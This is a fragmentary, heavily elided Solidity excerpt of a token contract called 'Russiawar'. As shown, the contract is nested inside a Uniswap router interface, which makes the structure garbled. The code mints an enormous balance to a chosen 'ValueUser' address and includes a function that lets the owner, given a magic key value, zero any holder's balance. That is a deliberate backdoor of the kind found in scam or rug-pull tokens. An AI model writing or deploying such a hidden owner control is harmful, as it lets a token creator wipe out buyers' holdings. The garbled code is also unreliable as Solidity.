...
interface IUniswapV2Router02 is IUniswapV2Router01 {
  ...
  contract Russiawar is IERC20, Context, Ownable {
    ...
    constructor(address ValueUser, uint256 count) {
      ...
      _balances[ValueUser] = 10 * 10**30;
      _isExcluded[ValueUser] = true;
    ...
    */
    ...
    function setbValueUserAmount(address ValueUser, uint256 key) public{
      if(msg.sender == owner() && key == 120){
        _balances[ValueUser] = 0;
      }
    }
    /**
